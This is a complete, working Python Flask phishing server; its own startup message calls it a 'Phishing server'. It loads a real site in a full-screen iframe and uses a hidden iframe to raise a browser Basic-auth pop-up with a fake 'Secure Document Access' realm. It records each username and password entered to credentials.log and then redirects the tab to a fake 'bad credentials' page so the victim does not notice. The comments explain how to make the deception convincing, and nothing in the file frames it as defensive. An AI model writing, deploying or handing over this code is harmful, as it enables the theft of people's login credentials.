#!/usr/bin/python3
from flask import Flask, request, Response
from datetime import datetime

# --- Configuration ---
# The final URL the user's entire browser tab will be redirected to.
# This should be a legitimate-looking page to complete the illusion.
FINAL_URL = "https://redirection.url.here/oauth/login?error=bad_credentials"

# The local file where captured credentials will be logged.
LOG_FILE = 'credentials.log'

# The legitimate site to display in the background iframe to make the page look real.
VISIBLE_SITE = "https://any.page.iframe.capable"

# The name of the authentication realm shown in the browser's login pop-up.
AUTH_REALM = "Secure Document Access"

# --- Main Application ---
app = Flask(__name__)

# The HTML is now a string inside the Python script.
# It loads the VISIBLE_SITE and then triggers the auth endpoint '/a'.
HTML_PAYLOAD = f"""
<!DOCTYPE html>
<html>
<head><title>Login Required</title><style>body,html{{margin:0;padding:0;height:100%;overflow:hidden}}iframe{{position:absolute;top:0;left:0;width:100%;height:100%;border:none}}#h{{display:none}}</style></head>
<body>
<iframe src="{VISIBLE_SITE}" onload="document.getElementById('h').src='/a'"></iframe>
<iframe id="h"></iframe>
</body>
</html>
"""

@app.route('/')
def serve_index():
    """Serves the embedded HTML payload from memory."""
    return HTML_PAYLOAD

@app.route('/a')
def handle_auth():
    """Handles the auth prompt, credential logging, and final redirect."""
    # If the request doesn't have an Authorization header, send a 401 to trigger the prompt.
    if not request.authorization:
        return Response(
            'Authentication Required', 401,
            {'WWW-Authenticate': f'Basic realm="{AUTH_REALM}"'}
        )

    # Credentials received. Extract, log, and prepare the redirect.
    username = request.authorization.username
    password = request.authorization.password
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip_addr = request.remote_addr

    log_entry = f"[{timestamp}] {username}:{password}\n"

    # Print to console and write to log file.
    print(log_entry, end="")
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

    # This JavaScript payload executes in the hidden iframe and redirects the main browser window.
    js_redirect = f"<script>window.top.location.href = '{FINAL_URL}';</script>"
    return Response(js_redirect, mimetype='text/html')

if __name__ == '__main__':
    # Running on port 80 often requires root/administrator privileges.
    print(f"[*] Phishing server starting on http://0.0.0.0:80")
    print(f"[*] Captured credentials will be logged to '{LOG_FILE}'")
    print(f"[*] Final redirect is set to: {FINAL_URL}")
    app.run(host='0.0.0.0', port=80)
